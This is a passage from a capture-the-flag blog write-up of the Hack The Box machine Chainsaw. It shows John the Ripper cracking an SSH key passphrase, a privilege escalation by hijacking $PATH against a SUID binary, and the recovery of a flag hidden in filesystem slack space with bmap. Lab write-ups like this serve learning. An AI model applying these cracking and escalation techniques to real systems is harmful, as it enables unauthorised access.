fa42aa62cb6cebfda325869ba964f93fc6df282a1282fa5f6680e4ec01762309b4e62d7cd5ad7d79536d7405dc441540dc8b1362c13a68052e8c7f108e67037fd59bf4984f04088fb8e0b72a56ddf

root@kali:~/Desktop/HTB/Chainsaw# john --wordlist=/root/Desktop/rockyou.txt bobby.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
jackychain       (bobby.key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:08 DONE (2019-10-27 12:22) 0.1172g/s 1681Kp/s 1681Kc/s 1681KC/sa6_123..*7¡Vamos!
Session completed
{% endhighlight %}

<p>And with that we should be able to use the private key to ssh in as bobby.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/user-pwned.PNG' | relative_url }}">
</p>

<h1>Root exploitation</h1>

<p>Now that we have user access we need to start enumerating for a vector to root.</p>

{% highlight shell %}
bobby@chainsaw:~$ ls -latr
total 52
-rw-r--r-- 1 bobby bobby  807 Sep 12  2018 .profile
-rw-r--r-- 1 bobby bobby 3771 Sep 12  2018 .bashrc
-rw-r--r-- 1 bobby bobby  220 Sep 12  2018 .bash_logout
drwx------ 2 bobby bobby 4096 Nov 30  2018 .cache
drwx------ 3 bobby bobby 4096 Nov 30  2018 .gnupg
lrwxrwxrwx 1 bobby bobby    9 Nov 30  2018 .bash_history -> /dev/null
drwxrwxr-x 3 bobby bobby 4096 Nov 30  2018 .local
drwxr-xr-x 4 root  root  4096 Dec 12  2018 ..
drwxrwxr-x 2 bobby bobby 4096 Dec 12  2018 resources
drwxrwxr-x 3 bobby bobby 4096 Dec 12  2018 .java
-rw-rw-r-- 1 bobby bobby    0 Dec 12  2018 .wget-hsts
drwxr-x--- 2 bobby bobby 4096 Dec 13  2018 .ssh
drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 projects
-r--r----- 1 bobby bobby   33 Jan 23  2019 user.txt
drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 .
{% endhighlight %}

<p>Digging slightly deeper into the projects folder we happen upon a nice SUID file. Very interesting!</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/root-enum.PNG' | relative_url }}">
</p>

<p>Let's pull that file over to our local instance. My thoughts at this point were we are going to need to do a little bit of RE to make the jump. I booted up ghidra to take a look at the decompile... and was thoroughly surprised at what I found.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/root-ghidra.PNG' | relative_url }}">
</p>

<p>Facepalm moment here is where I spent an hour or two trying to figure out how I could overwrite the <code>ChainsawClub</code> call. I even went so far as to modify the hex of the binary and upload it back to the host. Clearly that did not get me very far. Spent a bit of time taking a step back to tackle it at a different angle.<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">This article</a> was among those I perused and that's when it hit me. The <code>ChainsawClub</code> portion was full defined, but <code>sudo</code> itself was loosely defined! Since the binary is calling <code>setuid(0)</code> then calling <code>sudo</code> we should be able to inject our own sudo exploit variant in through <code>$PATH</code> hijacking! Bam, attack vector identified.</p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/root-shell.PNG' | relative_url }}">
</p>

<p>Excellent, now all that is left is to get the <code>root.txt</code> flag! Right? Maybe? </p>

<p align="center">
<img src="{{ '/assets/htb-chainsaw/root-troll.PNG' | relative_url }}">
</p>

<p>I have to admit, this part of the box I did not appreciate. For as good as the user portion of working with smart-contracts was this last bit for the <code>root.txt</code> flag was very contrived. With that said I did expand my knowledge on the following technique and I cannot complain too much as ultimately that is the purpose of going through all this - to learn new concepts and reinforce old ones. This part was not extremely obvious, however the HTB forums did have one excellent hint  - <i>"Don't slack off"</i>. After a little bit of searching read a few good articles, including <a href="https://techcyberz.wordpress.com/2014/01/30/hiding-data-slack-space-on-linux/">this one</a>, where they explained firstly what slack space is and ultimately how to use it for hiding data.</p>

<p>
<blockquote>
Before going to explain slack space, one should know what blocks (on Linux) and clusters mean (on Windows).  Blocks are specific sized containers used by file system to store data. Blocks can also be defined as the smallest pieces of data that a file system can use to store information. Files can consist of a single or multiple blocks/clusters in order to fulfill the size requirements of the file. When data is stored in these blocks two mutually exclusive conditions can occur; The block is completely full, or the block is partially full. If the block is completely full then the most optimal situation for the file system has occurred. If the block is only partially full then the area between the end of the file the end of the container is referred to as slack space
</blockquote>
</p>

<p>With theory understood found a few github repos for <code>bmap</code>. Unfortunately the first repo I cloned did not end up working properly, but quickly found <a href="https://github.com/CameronLonsdale/bmap.git">this repo</a> that did.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Chainsaw# git clone https://github.com/CameronLonsdale/bmap.git
Cloning into 'bmap'...
remote: Enumerating objects: 46, done.
remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 46
Unpacking objects: 100% (46/46), done.
root@kali:~/Desktop/HTB/Chainsaw# cd bmap
root@kali:~/Desktop/HTB/Chainsaw/bmap# ls
bmap.c        bmap.spec  dev_builder.c  index.html  LICENSE   man  NOTES   README.md  slacker-modules.c
bmap.sgml.m4  COPYING    include        libbmap.c   Makefile  mft  README  slacker.c
root@kali:~/Desktop/HTB/Chainsaw/bmap# make
....


root@kali:~/Desktop/HTB/Chainsaw# scp -i bobby.key bmap bobby@10.10.10.142:/home/bobby/bmap
Enter passphrase for key 'bobby.key': 
bmap                                                                                               100%   62KB 805.4KB/s   00:00   
{% endhighlight %}

<p align="center">
<img src="{{ '/assets/htb-chainsaw/root-owned.PNG' | relative_url }}">
</p>

<p>And just like that Chainsaw is in the books. Thanks folks, until next time!</p>